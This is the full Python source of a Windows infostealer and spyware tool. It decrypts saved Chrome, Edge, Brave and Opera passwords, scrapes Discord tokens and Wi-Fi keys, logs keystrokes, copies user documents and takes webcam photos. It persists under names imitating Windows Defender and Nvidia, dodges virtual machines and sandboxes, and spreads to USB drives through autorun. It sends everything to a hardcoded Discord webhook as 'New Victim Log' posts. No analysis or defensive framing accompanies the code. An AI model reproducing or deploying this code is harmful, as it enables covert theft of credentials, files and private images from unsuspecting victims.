import os
import sys
import json
import re
import sqlite3
import win32crypt
import base64
import shutil
import requests
import subprocess
import tempfile
import cv2
import platform
import socket
import getpass
import psutil
import time
import ctypes
import threading
import zipfile
from datetime import datetime
from Crypto.Cipher import AES
from pynput import keyboard
import winreg

# ===== CONFIG =====
WEBHOOK_URL = "[https://discord.com/api/webhooks/1394681552079949884/CptZDyJwJFbHHMHr5S194EEFNrMSML_OdGRP6G4Ia3zYME3kHOE1nUNHEmJuGApctkfy]"
CHECK_INTERVAL = 300  # 5 minutes
MAX_FILE_SIZE = 8 * 1024 * 1024  # 8MB (Discord limit)
TEMP_DIR = tempfile.gettempdir()
PERSISTENCE_NAMES = ["WindowsDefender", "SystemMetrics", "NvidiaDriver"]
DISCORD_TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"

# ===== MUTEX =====
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\WindowsAudioService")
if ctypes.GetLastError() == 183:
    os._exit(0)

# ===== UTILS =====
def check_webhook():
    try:
        return requests.get(WEBHOOK_URL, timeout=10).status_code == 200
    except:
        return False

def get_system_info():
    return {
        "ip": requests.get("https://api.ipify.org", timeout=10).text,
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "ram": f"{round(psutil.virtual_memory().total / (1024 ** 3))}GB",
        "gpu": str(subprocess.check_output("wmic path win32_VideoController get name", shell=True, stderr=subprocess.DEVNULL)),
        "antivirus": str(subprocess.check_output('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', shell=True, stderr=subprocess.DEVNULL))
    }

# ===== STEALTH TECHNIQUES =====
def hide_file(path):
    subprocess.run(
        f'attrib +h +s "{path}"',
        shell=True,
        stderr=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL
    )

def self_delete():
    try:
        bat_path = os.path.join(TEMP_DIR, f"cleanup_{os.getpid()}.bat")
        with open(bat_path, "w") as bat:
            bat.write(f"""
            @echo off
            chcp 65001 >nul
            timeout /t 3 /nobreak >nul
            del "{sys.argv[0]}" /f /q
            del "%~f0" /f /q
            """)
        subprocess.Popen(
            bat_path, 
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE,
            shell=True
        )
    except:
        pass

# ===== CORE FEATURES =====
def get_encryption_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password.startswith((b"v10", b"v11")) and key:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode("utf-8")
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return None

def steal_chromium_passwords():
    credentials = []
    browsers = {
        "Google Chrome": "Google\\Chrome\\User Data",
        "Microsoft Edge": "Microsoft\\Edge\\User Data",
        "Brave": "BraveSoftware\\Brave-Browser\\User Data",
        "Opera": "Opera Software\\Opera Stable"
    }

    for browser_name, relative_path in browsers.items():
        try:
            browser_path = os.path.join(os.getenv("LOCALAPPDATA"), relative_path)
            login_data_path = os.path.join(browser_path, "Default\\Login Data")
            
            if not os.path.exists(login_data_path):
                continue
                
            key = get_encryption_key(browser_path)
            temp_db = os.path.join(TEMP_DIR, f"{browser_name.replace(' ', '_')}_{os.getpid()}.db")
            
            try:
                shutil.copy2(login_data_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, username, encrypted_password in cursor.fetchall():
                    if not encrypted_password:
                        continue
                        
                    password = decrypt_password(encrypted_password, key)
                    if password:
                        credentials.append({
                            "browser": browser_name,
                            "url": url,
                            "username": username,
                            "password": password
                        })
            finally:
                conn.close()
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        except:
            continue
            
    return credentials

def steal_discord_tokens():
    tokens = []
    discord_paths = [
        os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb\\",
        os.getenv("APPDATA") + "\\DiscordPTB\\Local Storage\\leveldb\\",
        os.getenv("APPDATA") + "\\DiscordCanary\\Local Storage\\leveldb\\",
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(path, file), "r", errors="ignore") as f:
                            for line in f:
                                matches = re.findall(DISCORD_TOKEN_REGEX, line)
                                tokens.extend(matches)
                    except:
                        pass
    return list(set(tokens))

def steal_wifi_passwords():
    profiles = []
    try:
        output = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            shell=True,
            stderr=subprocess.DEVNULL
        ).decode("utf-8", errors="ignore")
        
        for line in output.split("\n"):
            if "All User Profile" in line:
                ssid = line.split(":")[1].strip()
                try:
                    password_output = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                        shell=True,
                        stderr=subprocess.DEVNULL
                    ).decode("utf-8", errors="ignore")
                    
                    if "Key Content" in password_output:
                        password = password_output.split("Key Content")[1].split(":")[1].split("\n")[0].strip()
                        profiles.append({"ssid": ssid, "password": password})
                except:
                    pass
    except:
        pass
    return profiles

def keylogger():
    log_file = os.path.join(TEMP_DIR, "syslog.tmp")
    
    def on_press(key):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                char = (
                    key.char 
                    if hasattr(key, "char") 
                    else f"<{key.name}>" if hasattr(key, "name") 
                    else str(key)
                )
                f.write(char)
        except:
            pass
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    while True:
        time.sleep(CHECK_INTERVAL)
        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
            try:
                with open(log_file, "rb") as log_data:
                    requests.post(
                        WEBHOOK_URL, 
                        files={"file": ("keys.txt", log_data)},
                        timeout=10
                    )
                open(log_file, "w").close()
            except:
                pass

def grab_files():
    grabbed_files = []
    extensions = [".txt", ".pdf", ".docx", ".xlsx", ".jpg", ".png", ".csv", ".sql"]
    folders = ["Desktop", "Documents", "Downloads", "OneDrive"]
    
    for folder in folders:
        full_path = os.path.join(os.getenv("USERPROFILE"), folder)
        if not os.path.exists(full_path):
            continue
            
        for root, _, files in os.walk(full_path):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    if os.path.isfile(file_path) and os.path.getsize(file_path) < MAX_FILE_SIZE:
                        grabbed_files.append(file_path)
    
    return grabbed_files

def webcam_snap():
    try:
        cam = cv2.VideoCapture(0)
        if not cam or not cam.isOpened():
            return None
            
        ret, frame = cam.read()
        cam.release()
        
        if ret:
            img_path = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.jpg")
            cv2.imwrite(img_path, frame)
            return img_path
    except:
        return None

# ===== PERSISTENCE =====
def add_persistence():
    # Startup folder (hidden)
    try:
        startup_path = os.path.join(
            os.getenv("APPDATA"), 
            "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        )
        exe_name = f"{PERSISTENCE_NAMES[0]}.exe"
        target_path = os.path.join(startup_path, exe_name)
        shutil.copy2(sys.argv[0], target_path)
        hide_file(target_path)
    except:
        pass
    
    # Registry (hidden)
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, PERSISTENCE_NAMES[1], 0, winreg.REG_SZ, sys.argv[0])
    except:
        pass
    
    # Task Scheduler (hidden)
    try:
        subprocess.run(
            f'schtasks /create /tn "{PERSISTENCE_NAMES[2]}" /tr "{sys.argv[0]}" /sc onlogon /rl highest /f',
            shell=True,
            stderr=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL
        )
    except:
        pass

# ===== ANTI-ANALYSIS =====
def anti_analysis():
    vm_indicators = [
        "vbox", "vmware", "virtualbox", "qemu", "xen", "hyperv",
        "sandbox", "malware", "analysis", "wire", "fiddler", "procmon"
    ]
    
    if any(indicator in platform.node().lower() for indicator in vm_indicators):
        os._exit(0)
        
    if any(indicator in getpass.getuser().lower() for indicator in vm_indicators):
        os._exit(0)
    
    for proc in psutil.process_iter():
        try:
            if any(indicator in proc.name().lower() for indicator in vm_indicators):
                os._exit(0)
        except:
            pass

# ===== USB SPREADER =====
def usb_spreader():
    while True:
        try:
            drives = [
                d for d in os.popen("wmic logicaldisk get caption").read().split() 
                if len(d) == 2 and os.path.exists(d)
            ]
            
            for drive in drives:
                target_exe = os.path.join(drive, "Private Photos.exe")
                if not os.path.exists(target_exe):
                    try:
                        shutil.copy2(sys.argv[0], target_exe)
                        hide_file(target_exe)
                        
                        with open(os.path.join(drive, "autorun.inf"), "w") as f:
                            f.write(f"""[AutoRun]
open=Private Photos.exe
action=View vacation pictures
icon=Private Photos.exe""")
                            
                        hide_file(os.path.join(drive, "autorun.inf"))
                    except:
                        pass
        except:
            pass
        
        time.sleep(60)

# ===== DATA EXFILTRATION =====
def send_to_webhook(data):
    def truncate(text, max_len=500):
        text = str(text)
        return text if len(text) <= max_len else f"{text[:max_len]}... [TRUNCATED]"
    
    embed = {
        "title": "📁 New Victim Log",
        "color": 0x3498db,
        "fields": [
            {
                "name": "🖥 System Info", 
                "value": f"```json\n{truncate(json.dumps(data['system'], indent=2))}\n```",
                "inline": False
            },
            {
                "name": "🔑 Discord Tokens", 
                "value": truncate(", ".join(data["discord_tokens"]) or "None"),
                "inline": True
            },
            {
                "name": "📶 Wi-Fi Networks", 
                "value": truncate(json.dumps(data["wifi_passwords"], indent=2)),
                "inline": True
            },
            {
                "name": "🌐 Browser Passwords", 
                "value": f"{len(data['chromium_passwords'])} credentials collected",
                "inline": False
            }
        ]
    }
    
    files = []
    try:
        if data.get("webcam"):
            with open(data["webcam"], "rb") as f:
                files.append(("webcam.jpg", f))
                embed["image"] = {"url": "attachment://webcam.jpg"}
                
        for file_path in data.get("grabbed_files", [])[:3]:
            with open(file_path, "rb") as f:
                files.append((os.path.basename(file_path), f))
                
        requests.post(
            WEBHOOK_URL,
            files=files,
            data={"payload_json": json.dumps({"embeds": [embed]})},
            timeout=15
        )
    except:
        pass
    finally:
        if data.get("webcam"):
            try:
                os.remove(data["webcam"])
            except:
                pass
        for _, f in files:
            try:
                f.close()
            except:
                pass

# ===== MAIN =====
def main():
    if not check_webhook():
        os._exit(0)
        
    anti_analysis()
    add_persistence()
    self_delete()  # Remove original file
    
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=usb_spreader, daemon=True).start()
    
    while True:
        data = {
            "system": get_system_info(),
            "discord_tokens": steal_discord_tokens(),
            "chromium_passwords": steal_chromium_passwords(),
            "wifi_passwords": steal_wifi_passwords(),
            "grabbed_files": grab_files(),
            "webcam": webcam_snap(),
        }
        
        send_to_webhook(data)
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()